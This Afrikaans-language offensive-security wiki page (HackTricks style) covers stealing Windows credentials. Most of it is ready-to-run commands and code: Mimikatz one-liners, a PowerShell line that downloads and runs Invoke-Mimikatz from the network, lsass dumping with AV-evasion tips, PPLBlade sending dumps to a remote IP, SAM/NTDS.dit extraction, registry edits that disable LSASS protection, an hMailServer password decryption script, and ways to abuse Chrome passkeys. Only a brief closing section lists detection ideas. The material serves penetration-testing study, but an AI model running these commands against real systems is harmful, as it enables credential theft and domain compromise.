# Windows-aanmeldbewyse steel

{{#include ../../banners/hacktricks-training.md}}

## Mimikatz-aanmeldbewyse
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Vind ander dinge wat Mimikatz kan doen op** [**hierdie bladsy**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Lees hier oor sommige moontlike beskermingsmaatreëls vir credentials.**](credentials-protections.md) **Hierdie beskermingsmaatreëls kan voorkom dat Mimikatz sommige credentials onttrek.**

## Credentials met Meterpreter

Gebruik die [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **wat** ek geskep het om **na wagwoorde en hashes** binne die slagoffer te **soek**.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV omseil

### Procdump + Mimikatz

Aangesien **Procdump van** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'n wettige Microsoft-tool is**, word dit nie deur Defender bespeur nie.\
Jy kan hierdie tool gebruik om die **lsass-proses te dump**, die **dump af te laai** en die **credentials plaaslik** uit die dump te **ekstraheer**.

Jy kan ook [SharpDump](https://github.com/GhostPack/SharpDump) gebruik.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Hierdie proses word outomaties met [SprayKatz](https://github.com/aas-n/spraykatz) uitgevoer: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Sommige **AV** mag die gebruik van **procdump.exe om lsass.exe te dump** as **kwaadwillig** **detect**, omdat hulle die string **"procdump.exe" en "lsass.exe"** **detect**. Dit is dus **stealthier** om die **PID** van lsass.exe as ’n **argument** aan procdump deur te gee **in plaas van** die **naam lsass.exe.**

### Dumping van lsass met **comsvcs.dll**

’n DLL genaamd **comsvcs.dll**, wat in `C:\Windows\System32` gevind word, is verantwoordelik vir die **dumping van prosesgeheue** wanneer ’n crash plaasvind. Hierdie DLL bevat ’n **funksie** genaamd **`MiniDumpW`**, wat ontwerp is om met `rundll32.exe` aangeroep te word.\
Dit is irrelevant om die eerste twee argumente te gebruik, maar die derde een word in drie komponente verdeel. Die proses-ID wat gedump moet word, vorm die eerste komponent, die dump-lêer se ligging verteenwoordig die tweede, en die derde komponent is streng die woord **full**. Geen alternatiewe opsies bestaan nie.\
Nadat hierdie drie komponente geparse is, word die DLL gebruik om die dump-lêer te skep en die gespesifiseerde proses se geheue na hierdie lêer oor te dra.\
Die **comsvcs.dll** kan gebruik word om die lsass-proses te dump, wat die behoefte uitskakel om procdump op te laai en uit te voer. Hierdie metode word volledig beskryf by [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Die volgende opdrag word vir uitvoering gebruik:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Jy kan hierdie proses outomatiseer met** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping van lsass met Task Manager**

1. Regskliek op die Taakbalk en klik op Task Manager
2. Klik op Meer besonderhede
3. Soek die proses "Local Security Authority Process" in die Processes-oortjie
4. Regskliek op die proses "Local Security Authority Process" en klik op "Create dump file".

### Dumping van lsass met procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is 'n Microsoft-ondertekende binary wat deel is van die [sysinternals](https://docs.microsoft.com/en-us/sysinternals/)-suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumping lsass met PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is a Protected Process Dumper Tool wat memory dump kan obfuscate en dit na remote workstations kan oordra sonder om dit op die disk te laat.

**Sleutelfunksionaliteite**:

1. Bypassing PPL protection
2. Obfuscating memory dump-lêers om Defender signature-based detection mechanisms te ontduik
3. Uploading memory dump met RAW- en SMB-uploadmetodes sonder om dit op die disk te laat (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-gebaseerde LSASS-dumping sonder MiniDumpWriteDump

Ink Dragon lewer ’n driefase-dumper genaamd **LalsDumper** wat nooit `MiniDumpWriteDump` aanroep nie, dus word EDR-hooks op daardie API nooit geaktiveer nie:<sup>[[3]](#references)</sup>

1. **Fase 1 loader (`lals.exe`)** – soek `fdp.dll` vir ’n plekhouer wat uit 32 kleinletter-`d`-karakters bestaan, oorskryf dit met die absolute pad na `rtu.txt`, stoor die gelapte DLL as `nfdp.dll`, en roep `AddSecurityPackageA("nfdp","fdp")` aan. Dit dwing **LSASS** om die kwaadwillige DLL as ’n nuwe Security Support Provider (SSP) te laai.
2. **Fase 2 binne LSASS** – wanneer LSASS `nfdp.dll` laai, lees die DLL `rtu.txt`, XOR elke greep met `0x20`, en map die gedekodeerde blob in geheue voordat uitvoering oorgedra word.
3. **Fase 3 dumper** – die gemapte payload herimplementeer MiniDump-logika deur **direct syscalls** wat uit gehashte API-name opgelos word (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). ’n Toegewyde export genaamd `Tom` maak `%TEMP%\<pid>.ddt` oop, stroom ’n saamgeperste LSASS-dump na die lêer, en maak die handle toe sodat exfiltration later kan plaasvind.

Operator-notas:

* Hou `lals.exe`, `fdp.dll`, `nfdp.dll`, en `rtu.txt` in dieselfde gids. Fase 1 herskryf die hardgekodeerde plekhouer met die absolute pad na `rtu.txt`, dus breek die ketting as hulle geskei word.
* Registrasie gebeur deur `nfdp` by `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` aan te heg. Jy kan daardie waarde self vooraf instel om LSASS elke boot die SSP te laat herlaai.
* `%TEMP%\*.ddt`-lêers is saamgeperste dumps. Decomprimeer dit plaaslik, en voer dit dan aan Mimikatz/Volatility vir credential extraction.
* Om `lals.exe` uit te voer, word admin/SeTcb-regte vereis sodat `AddSecurityPackageA` slaag; sodra die aanroep terugkeer, laai LSASS die rogue SSP deursigtig en voer Fase 2 uit.
* Deur die DLL van die skyf te verwyder, verwyder dit nie uit LSASS nie. Vee óf die register-inskrywing uit en herbegin LSASS (herlaai die rekenaar), óf laat dit vir langtermyn-persistentie.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump die NTDS.dit vanaf target DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump die wagwoordgeskiedenis van NTDS.dit vanaf die teiken-DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Vertoon die pwdLastSet-attribuut vir elke NTDS.dit-rekening
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Hierdie lêers behoort in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM_ te wees. Maar **jy kan hulle nie sommer op die gewone manier kopieer nie**, omdat hulle beskerm is.

### From Registry

Die maklikste manier om hierdie lêers te steel, is om ’n kopie uit die registry te kry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Laai** daardie lêers na jou Kali-masjien af en **ekstraheer die hashes** met:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Jy kan beskermde lêers met behulp van hierdie diens kopieer. Jy moet 'n Administrator wees.

#### Using vssadmin

Die vssadmin-binary is slegs in Windows Server-weergawes beskikbaar
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Maar jy kan dieselfde vanuit **Powershell** doen. Dit is ’n voorbeeld van **hoe om die SAM-lêer te kopieer** (die gebruikte hardeskyf is "C:" en dit word in C:\users\Public gestoor), maar jy kan dit gebruik om enige beskermde lêer te kopieer:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kode uit die boek: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Laastens kan jy ook die [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) gebruik om 'n kopie van SAM, SYSTEM en ntds.dit te maak.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory-geloofsbriewe - NTDS.dit**

Die **NTDS.dit**-lêer staan bekend as die hart van **Active Directory** en bevat belangrike data oor gebruikersobjekte, groepe en hul lidmaatskappe. Dit is waar die **wagwoord-hashes** vir domeingebruikers gestoor word. Hierdie lêer is 'n **Extensible Storage Engine (ESE)**-databasis en is geleë by **_%SystemRoom%/NTDS/ntds.dit_**.

Binne hierdie databasis word drie primêre tabelle onderhou:

- **Data Table**: Hierdie tabel is verantwoordelik vir die stoor van besonderhede oor objekte soos gebruikers en groepe.
- **Link Table**: Dit hou verhoudings, soos groeplidmaatskappe, by.
- **SD Table**: **Security descriptors** vir elke objek word hier gehou, wat die sekuriteit en toegangsbeheer vir die gestoorde objekte verseker.

Meer inligting hieroor: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)<sup>[[8]](#references)</sup>

Windows gebruik _Ntdsa.dll_ om met daardie lêer te kommunikeer, en dit word deur _lsass.exe_ gebruik. Daarna kan **'n deel** van die **NTDS.dit**-lêer **binne die `lsass`**-geheue geleë wees (jy kan waarskynlik die data wat die mees onlangs verkry is, vind weens die prestasieverbetering deur 'n **cache** te gebruik).

#### De-enkripsie van die hashes binne NTDS.dit

Die hash word 3 keer geënkripteer:

1. De-enkripteer Password Encryption Key (**PEK**) met die **BOOTKEY** en **RC4**.
2. De-enkripteer die **hash** met **PEK** en **RC4**.
3. De-enkripteer die **hash** met **DES**.

**PEK** het dieselfde waarde in **elke domeinbeheerder**, maar dit word binne die **NTDS.dit**-lêer geënkripteer met die **BOOTKEY** van die **SYSTEM-lêer van die domeinbeheerder (dit verskil tussen domeinbeheerders)**. Daarom het jy die lêers NTDS.dit en SYSTEM (_C:\Windows\System32\config\SYSTEM_) nodig om die geloofsbriewe uit die NTDS.dit-lêer te verkry.

### Kopiëring van NTDS.dit met Ntdsutil

Beskikbaar sedert Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Jy kan ook die [**volume shadow copy**](#stealing-sam-and-system)-tegniek gebruik om die **ntds.dit**-lêer te kopieer. Onthou dat jy ook ’n kopie van die **SYSTEM-lêer** sal benodig (weereens, [**dump dit from the registry or use the volume shadow copy**](#stealing-sam-and-system)-tegniek).

### **Extracting hashes from NTDS.dit**

Sodra jy die lêers **NTDS.dit** en **SYSTEM** **verkry** het, kan jy tools soos _secretsdump.py_ gebruik om die **hashes te extract**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Jy kan dit ook outomaties onttrek deur 'n geldige domain admin user te gebruik:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Vir **groot NTDS.dit-lêers** word dit aanbeveel om dit met [gosecretsdump](https://github.com/c-sto/gosecretsdump) te onttrek.

Uiteindelik kan jy ook die **metasploit module** gebruik: _post/windows/gather/credentials/domain_hashdump_ of **mimikatz** `lsadump::lsa /inject`

### **Onttrekking van domeinobjekte uit NTDS.dit na ’n SQLite-databasis**

NTDS-objekte kan met [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) na ’n SQLite-databasis onttrek word. Nie net word geheime onttrek nie, maar ook die volledige objekte en hul attribute vir verdere inligtingsonttrekking wanneer die rou NTDS.dit-lêer reeds verkry is.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Die `SYSTEM` hive is opsioneel, maar maak die dekripsie van secrets moontlik (NT- en LM-hashes, supplemental credentials soos cleartext passwords, kerberos- of trust keys, NT- en LM-password histories). Saam met ander inligting word die volgende data onttrek: user- en machine accounts met hul hashes, UAC flags, tydstempel van die laaste logon en password change, account descriptions, names, UPN, SPN, groups en recursive memberships, organisasie-eenhede se boomstruktuur en membership, trusted domains met trust-tipe, rigting en attributes...

## Lazagne

Laai die binary [hier](https://github.com/AlessandroZ/LaZagne/releases) af. Jy kan hierdie binary gebruik om credentials uit verskeie software te onttrek.
```
lazagne.exe all
```
## Ander tools vir die onttrekking van credentials uit SAM en LSASS

### Windows credentials Editor (WCE)

Hierdie tool kan gebruik word om credentials uit die memory te onttrek. Laai dit af vanaf: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Onttrek credentials uit die SAM-lêer
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Onttrek geloofsbriewe uit die SAM-lêer
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Laai dit af vanaf:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) en **voer dit eenvoudig uit**, waarna die wagwoorde onttrek sal word.

## Ontginning van onaktiewe RDP-sessies en verswakking van sekuriteitskontroles

Ink Dragon se FinalDraft RAT sluit ’n `DumpRDPHistory`-tasker in waarvan die tegnieke vir enige red-teamer nuttig is:<sup>[[3]](#references)</sup>

### DumpRDPHistory-styl-telemetrie-insameling

* **Uitgaande RDP-teikens** – ontleed elke gebruiker-hive by `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Elke subkey stoor die bedienernaam, `UsernameHint` en die tydstempel van die laaste wysiging. Jy kan FinalDraft se logika met PowerShell repliseer:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Bewyse van inkomende RDP** – doen navraag by die `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational`-log vir Gebeurtenis-ID’s **21** (suksesvolle aanmelding) en **25** (ontkoppeling) om vas te stel wie die masjien geadministreer het:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Sodra jy weet watter Domain Admin gereeld koppel, dump LSASS (met LalsDumper/Mimikatz) terwyl hul **ontkoppelde** sessie steeds bestaan. CredSSP + NTLM fallback laat hul verifier en tokens in LSASS agter, wat dan oor SMB/WinRM hergebruik kan word om `NTDS.dit` te bekom of persistence op domain controllers te vestig.

### Register-downgrades wat deur FinalDraft geteiken word

Dieselfde implant peuter ook met verskeie register-sleutels om credential theft makliker te maak:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Deur `DisableRestrictedAdmin=1` te stel, word volledige credential-/ticket-hergebruik tydens RDP afgedwing, wat pass-the-hash-styl-pivots moontlik maak.
* `LocalAccountTokenFilterPolicy=1` deaktiveer UAC-tokenfiltrering sodat plaaslike admins onbeperkte tokens oor die netwerk kry.
* `DSRMAdminLogonBehavior=2` laat die DSRM-administrator aanmeld terwyl die DC aanlyn is, wat aanvallers nog ’n ingeboude hoëvoorreg-rekening gee.
* `RunAsPPL=0` verwyder LSASS PPL-beskerming, wat geheuetoegang triviaal maak vir dumpers soos LalsDumper.

## hMailServer-databasisbewyse (post-compromise)

hMailServer stoor sy DB-wagwoord in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` onder `[Database] Password=`. Die waarde is Blowfish-geënkripteer met die statiese sleutel `THIS_KEY_IS_NOT_SECRET` en 4-grepe-woord-endianness-wisselings. Gebruik die hex-string uit die INI met hierdie Python-snippet:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Met die clear-text wagwoord, kopieer die SQL CE-databasis om file locks te vermy, laai die 32-bis provider, en upgrade indien nodig voordat jy hashes navraag doen:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Die `accountpassword`-kolom gebruik die hMailServer-hash-formaat (hashcat-modus `1421`). Deur hierdie waardes te crack, kan herbruikbare credentials vir WinRM/SSH-pivots verskaf word.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Sommige tooling vang **plaintext logon-wagwoorde** vas deur die LSA logon callback `LsaApLogonUserEx2` te onderskep. Die idee is om die authentication package callback te hook of te wrap sodat credentials **tydens logon** vasgevang word (voor hashing), en dan na skyf geskryf of aan die operator teruggestuur word. Dit word gewoonlik geïmplementeer as ’n helper wat in LSA inject of daarmee registreer, en dan elke suksesvolle interactive/network logon-event met die username, domain en password aanteken.<sup>[[1]](#references)</sup>

Operasionele notas:
- Vereis local admin/SYSTEM om die helper in die authentication path te laai.
- Vasgevange credentials verskyn slegs wanneer ’n logon plaasvind (interactive, RDP, service of network logon, afhangend van die hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) stoor saved connection-information in ’n per-user `sqlstudio.bin`-lêer. Gespesialiseerde dumpers kan die lêer parse en saved SQL-credentials herwin. In shells wat slegs command output terugstuur, word die lêer dikwels geëksfiltreer deur dit as Base64 te encode en dit na stdout te print.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Aan die operateurkant, herbou die lêer en voer die dumper plaaslik uit om credentials te herwin:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Passkeys / WebAuthn credential theft uit Chrome op Windows

As code execution verkry word as die **victim user** op ’n Windows-host met **Chrome + Google Password Manager synced passkeys**, word passkeys ’n interessante post-exploitation-teiken, selfs **sonder admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Interessante plaaslike artefakte
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** stoor protobuf-geënkodeerde **`WebauthnCredentialSpecifics`**-rekords. ’n Proses van dieselfde gebruiker kan die **RP ID**, **gebruikersnaam**, **credential ID** en geënkripteerde private-key-materiaal vir gesinkroniseerde passkeys opsom.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** stoor plaaslike toestel-inskrywingstatus, soos **`wrapped_identity_private_key`**, en die wrapped secret wat gebruik word om gesinkroniseerde credentials te herstel.<sup>[[4]](#references)</sup>

Vinnige triage:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-gebonde sleutel-blobbe kan steeds as 'n plaaslike ondertekeningsorakel misbruik word

As die browser 'n TPM-gesteunde identiteitsleutel as **`NCRYPT_OPAQUE_KEY_BLOB`** uitvoer en daardie blob in gebruikerstoeganklike toestand stoor, hoef malware nie die rou private key te onttrek nie. Dit kan eenvoudig die blob op die **same machine** herinvoer en die plaaslike TPM vra om aanvaller-beheerde data te onderteken:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Dit beteken **hardware binding voorkom uitvoer buite die toestel, maar nie gebruik deur dieselfde gebruiker op die gekompromitteerde endpoint nie**.

### Praktiese misbruikpaaie

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Enumerate `WebauthnCredentialSpecifics` vanaf Chrome se LevelDB.
- Begin 'n passkey-aanmelding en verkry 'n vars WebAuthn challenge.
- Gebruik die gesteelde `wrapped_identity_private_key`-blob op die slagoffer se TPM om die cloud-authenticator request binding te onderteken.
- Relay die teruggekeerde assertion na die relying party.
- Dit is veral waardevol wanneer die RP `userVerification=preferred` aanvaar of versuim om assertions met **`UV=0`** te verwerp.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- Dwing her-onboarding af deur `passkey_enclave_state` te verwyder of deur 'n geldige, ondertekende `device/forget`-operasie te stuur.
- Indien onboarding die toestel in **`uv_key_pending`** laat, registreer 'n aanvaller-beheerde UV-public key.
- Indien die provider nie attestation / secure-hardware origin vir die nuwe UV-key verifieer nie, word latere handtekeninge vanaf die aanvaller se key as **`UV=1`** behandel.
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- Dwing recovery of heraansluiting af sodat Chrome die gesinkroniseerde-passkey master secret aflaai.
- Monitor vir herskepping/wysiging van `passkey_enclave_state`, en dump dan Chrome se memory terwyl die plaintext **security domain secret (SDS)** in memory teenwoordig is.
- Gebruik die herwonne SDS om die geënkripteerde velde in elke `WebauthnCredentialSpecifics`-rekord te dekripteer en draagbare WebAuthn private keys te herwin.

### DFIR / opsporingsidees

- Monitor die **verwydering/herskepping** van `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Skep 'n waarskuwing vir abnormale toegang tot Chrome se **`Sync Data\LevelDB`** deur nie-browser-prosesse.
- Skep 'n waarskuwing vir **Chrome memory dumps** of verdagte cross-process memory access.
- Ondersoek herhaalde **Google Password Manager recovery PIN**-aanwysings of onverwagte her-onboarding.
- Onthou dat WebAuthn se **`signCount`** dikwels nie nuttig is vir gesinkroniseerde passkeys nie, omdat dit konstant kan bly; klassieke kloonopsporing is dus swak.

## References

- [1] [Unit 42 – An Investigation Into Years of Undetected Operations Targeting High-Value Sectors](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: A Novel Attack Surface in Passwordless Authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [How the Active Directory Data Store Really Works: Inside NTDS.dit (Part 1)](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

{{#include ../../banners/hacktricks-training.md}}
